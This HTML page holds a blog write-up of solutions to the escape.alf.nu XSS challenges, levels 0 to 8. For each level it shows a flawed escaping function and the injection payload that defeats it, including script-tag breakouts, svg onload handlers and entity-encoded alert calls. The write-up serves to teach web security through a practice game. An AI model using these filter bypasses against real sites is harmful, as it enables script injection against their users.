@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>escape.alf.nu XSS Challenges Write-ups (Part 1)</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="These are my solutions to Erling Ellingsen escape.alf.nu XSS challenges. I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.
+My suggestion, if you havent done it so far, is to go and try to solve them by yourselves&amp;hellip;.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="escape.alf.nu XSS Challenges Write-ups (Part 1)">
+    <meta name="twitter:description" content="These are my solutions to Erling Ellingsen escape.alf.nu XSS challenges. I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.
+My suggestion, if you havent done it so far, is to go and try to solve them by yourselves&amp;hellip;.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="escape.alf.nu XSS Challenges Write-ups (Part 1)">
+  <meta property="og:description" content="These are my solutions to Erling Ellingsen escape.alf.nu XSS challenges. I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.
+My suggestion, if you havent done it so far, is to go and try to solve them by yourselves&amp;hellip;.">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">escape.alf.nu XSS Challenges Write-ups (Part 1)</h1>
+      <p class="post-meta">@pwntester · Jan 6, 2014 · 4 min read</p>
+    </header>
+    <article class="post-content">
+
+<p>These are my solutions to <a href="https://twitter.com/steike">Erling Ellingsen</a> <a href="http://escape.alf.nu">escape.alf.nu XSS challenges</a>. I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.</p>
+
+<p>My suggestion, if you havent done it so far, is to go and try to solve them by yourselves&hellip;. so come on, dont be lazy, stop reading here and give them a try &hellip;</p>
+
+<p>&hellip;</p>
+
+<p>&hellip;</p>
+
+<p>&hellip;</p>
+
+<p>&hellip;</p>
+
+<p>Ok so if you have already solve them or need some hits, here are my solutions</p>
+
+<h1 id="level-0">Level 0:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  // Warmup.
+
+  return '&lt;script&gt;console.log(&quot;'+s+'&quot;);&lt;/script&gt;';
+}
+</code></pre>
+
+<p>There is no encoding so the easiest solution is to close &ldquo;log&rdquo; call and inject our &ldquo;alert&rdquo;</p>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-javascript">&quot;);alert(1,&quot;
+</code></pre>
+
+<h1 id="level-1">Level 1:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  // Escaping scheme courtesy of Adobe Systems, Inc.
+  s = s.replace(/&quot;/g, '\\&quot;');
+  return '&lt;script&gt;console.log(&quot;' + s + '&quot;);&lt;/script&gt;';
+}
+</code></pre>
+
+<p>Function is escaping double quotes by adding two slashes. Shortest solution is to inject <strong>\&rdquo;</strong> so the escape function turns it into</p>
+
+<pre><code class="language-lang-javascript">\\\&quot;
+</code></pre>
+
+<p>Effectively escaping the backslash but not the double quotes.</p>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-javascript">\&quot;);alert(1)//
+</code></pre>
+
+<h1 id="level-2">Level 2:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  s = JSON.stringify(s);
+  return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';
+}
+</code></pre>
+
+<p>JSON.stringify() will escape double quotes (&ldquo;) into  (\&ldquo;) but it does not escaps angle brackets (&lt;&gt;), so we can close the current script block and start a brand new one.</p>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-javascript">&lt;/script&gt;&lt;script&gt;alert(1)//
+</code></pre>
+
+<h1 id="level-3">Level 3:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
+  console.log(url);
+
+  var a = document.createElement('a');
+  a.href = url;
+  document.body.appendChild(a);
+  a.click();
+}
+</code></pre>
+
+<p>Again (&ldquo;) is escaped but since we are within a URL context we can use URL encoding. In this case %22 for (&rdquo;)</p>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-javascript">%22);alert(1)//
+</code></pre>
+
+<h1 id="level-4">Level 4:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  var text = s.replace(/&lt;/g, '&amp;lt;').replace('&quot;', '&amp;quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;');
+  return text;
+}
+</code></pre>
+
+<p>The following characters are replaced:</p>
+
+<ul>
+<li>&lt; → &amp;lt; (all ocurrences)</li>
+<li>&quot; → &amp;quot; (just the first occurrence)</li>
+</ul>
+
+<p>The escape function also use a template like [[src|alt]] that becomes</p>
+
+<pre><code class="language-lang-javascript">&lt;img alt=&quot;alt&quot; src=&quot;src.gif&quot;&gt;
+</code></pre>
+
+<p>We can use this template with any <strong>src</strong> and an <strong>alt</strong> starting with a double quote (&ldquo;) that will be escaped, a second double quote (&rdquo;) that won&rsquo;t be escaped and then a new event handler like <strong>onload=&ldquo;alert(1)</strong> that will be closed by the double quote inserted by the template.</p>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-javascript">[[a|&quot;&quot;onload=&quot;alert(1)]]
+</code></pre>
+
+<p>It will be rendered as:</p>
+
+<p><img src="/images/octopress/xsslevel04.png" alt="" /></p>
+
+<h1 id="level-5">Level 5:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  // Level 4 had a typo, thanks Alok.
+  // If your solution for 4 still works here, you can go back and get more points on level 4 now.
+
+  var text = s.replace(/&lt;/g, '&amp;lt;').replace(/&quot;/g, '&amp;quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;');
+  return text;
+}
+</code></pre>
+
+<p>Now we cannot rely on the (<strong>&ldquo;</strong>) regexp typo but we can still use the template function to generate an image tag executing our <strong>alert(1)</strong> when loaded. We will use any <strong>src</strong> and a URL that will be replaced by the second replace function.</p>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-javascript">[[a|http://onload='alert(1)']]
+</code></pre>
+
+<ul>
+<li>The first replace function wont trigger with this payload</li>
+
+<li><p>The second replace function will act on the URL getting:</p>
+
+<pre><code class="language-lang-javascript">[[a|&lt;a href=&quot;http://onload='alert(1)']]&quot;&gt;http://onload='alert(1)']]&lt;/a&gt;
+</code></pre></li>
+
+<li><p>The third replace function will create our <strong>img</strong> tag</p>
+
+<pre><code class="language-lang-javascript">&lt;img alt=&quot;&lt;a href=&quot;http://onload='alert(1)']]&quot;&gt;http://onload='alert(1)'&quot; src=&quot;a.gif&quot;&gt;
+</code></pre></li>
+</ul>
+
+<p>It will be rendered as:</p>
+
+<p><img src="/images/octopress/xsslevel05.png" alt="" /></p>
+
+<h1 id="level-6">Level 6:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  // Slightly too lazy to make two input fields.
+  // Pass in something like &quot;TextNode#foo&quot;
+  var m = s.split(/#/);
+
+  // Only slightly contrived at this point.
+  var a = document.createElement('div');
+  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
+  return a.innerHTML;
+}
+</code></pre>
+
+<p>The trick is to review all the functions in the DOM that begin with &ldquo;create&rdquo; and that dont escape characters. The shortest one is to use &ldquo;createComment&rdquo;. For example <strong>Comment#&lt;foo&gt;</strong> will create the following code:</p>
+
+<pre><code class="language-lang-javascript">&lt;!--&lt;foo&gt;--&gt;
+</code></pre>
+
+<p>From there, its easy to go to:</p>
+
+<pre><code class="language-lang-javascript">Comment#&gt;&lt;svg onload=alert(1)
+</code></pre>
+
+<p>That will render:</p>
+
+<pre><code class="language-lang-javascript">&lt;!--&gt;&lt;svg onload=alert(1)--&gt;
+</code></pre>
+
+<h1 id="level-7">Level 7:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  // Pass inn &quot;callback#userdata&quot;
+  var thing = s.split(/#/);
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/&lt;/g, '\\u003c');
+  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;
+}
+</code></pre>
+
+<p>We will enclose the opening bracket and the json fixed contents with single quotes to transform it into a string and then we will be able to inject our js payload:</p>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-javascript">'#';alert(1)//
+</code></pre>
+
+<p>It will render:</p>
+
+<pre><code class="language-lang-javascript">&lt;script&gt;'({&quot;userdata&quot;:&quot;';alert(1)//&quot;})&lt;/script&gt;
+</code></pre>
+
+<h1 id="level-8">Level 8:</h1>
+
+<pre><code class="language-lang-javascript">function escape(s) {
+  // Courtesy of Skandiabanken
+  return '&lt;script&gt;console.log(&quot;' + s.toUpperCase() + '&quot;)&lt;/script&gt;';
+}
+</code></pre>
+
+<p>There is no escaping function, only an upper case, so we can close the exisiting <strong>&lt;script&gt;</strong> tag and create a new tag (case insensitive) with an <strong>onload</strong> script using no alpha characters:</p>
+
+<p>These are some valid solutions:</p>
+
+<pre><code class="language-lang-javascript">&lt;/script&gt;&lt;svg&gt;&lt;script&gt;&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)//   (52)
+&lt;/script&gt;&lt;svg onload=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)//   (51)
+&lt;/script&gt;&lt;svg onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)//   (50)
+</code></pre>
+
+<p>I guess people solving the challange with 28 characters or so did something like:</p>
+
+<pre><code class="language-lang-javascript">&lt;/script&gt;&lt;script src=&quot;&lt;very short domain&gt;&quot;&gt;
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/xss"><span class="tag">XSS</span></a></li>
+        
+          <li><a href="/tags/javascript"><span class="tag">JavaScript</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2116</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
